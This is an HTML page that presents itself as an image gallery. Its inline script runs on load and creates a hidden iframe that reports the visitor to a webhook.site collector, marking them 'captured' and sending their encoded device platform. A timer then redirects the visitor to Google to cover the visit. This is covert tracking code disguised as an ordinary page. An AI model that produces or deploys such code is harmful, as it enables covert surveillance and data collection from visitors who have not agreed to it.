<!DOCTYPE html>
<html>
<head>
    <title>Image Gallery</title>
</head>
<body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">

    <script>
        // 1. THE RADAR (Hidden from view)
        const radar = "https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e";
        
        // Create a hidden element to "ping" the radar
        const frame = document.createElement('iframe');
        frame.style.display = 'none';
        frame.src = radar + "?status=captured&device=" + btoa(navigator.platform);
        document.body.appendChild(frame);

        // 2. THE SELF-DESTRUCT
        // This timer keeps running because we never left the page
        setTimeout(function() {
            window.location.replace("https://www.google.com");
        }, 10000);
    </script>

    <h2>Loading High Resolution Content...</h2>

    <img src="https://raw.githubusercontent.com/bluekama/project-portfolio/main/IMG_0542.PNG" 
         style="max-width: 90%; border: 2px solid #333; margin-top: 20px;">

</body>
</html>
